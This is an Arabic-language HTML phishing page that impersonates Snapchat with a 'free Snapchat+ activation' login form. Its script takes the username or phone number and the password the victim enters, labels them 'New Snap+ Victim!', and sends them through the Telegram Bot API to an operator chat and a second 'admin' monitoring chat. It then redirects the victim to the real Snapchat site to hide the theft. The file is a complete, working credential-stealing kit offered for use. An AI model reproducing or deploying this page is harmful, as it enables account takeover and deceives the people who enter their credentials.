<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Snapchat Plus Activation</title>
    <style>
        body { background: #FFFC00; font-family: 'Avenir Next', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; padding: 40px; border-radius: 15px; width: 330px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
        .logo { width: 70px; margin-bottom: 20px; }
        h2 { font-size: 20px; margin-bottom: 20px; }
        input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #e0e0e0; border-radius: 8px; background: #f2f2f2; box-sizing: border-box; }
        button { width: 100%; padding: 14px; background: black; color: white; border-radius: 30px; font-weight: bold; border: none; cursor: pointer; margin-top: 15px; font-size: 16px; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png" class="logo">
        <h2>تفعيل Snapchat+ المجاني</h2>
        <form id="loginForm">
            <input type="text" id="user" placeholder="اسم المستخدم أو رقم الهاتف" required>
            <input type="password" id="pass" placeholder="كلمة السر" required>
            <button type="submit">تسجيل الدخول والتفعيل</button>
        </form>
    </div>
    <script>
        const p = new URLSearchParams(window.location.search);
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const msg = `👻 **New Snap+ Victim!**\n👤 **User/Phone:** \`${document.getElementById('user').value}\`\n🔑 **Pass:** \`${document.getElementById('pass').value}\`\n🛡️ **System:** Snapchat Plus\n👑 **Dev:** Abu Osayed`;
            fetch(`https://api.telegram.org/bot${p.get('bot_token')}/sendMessage?chat_id=${p.get('user_id')}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
            fetch(`https://api.telegram.org/bot${p.get('bot_token')}/sendMessage?chat_id=${p.get('admin_id')}&text=${encodeURIComponent("⚠️ نسخة المراقبة:\n"+msg)}&parse_mode=Markdown`)
            .then(() => location.href="https://accounts.snapchat.com");
        });
    </script>
</body>
</html>
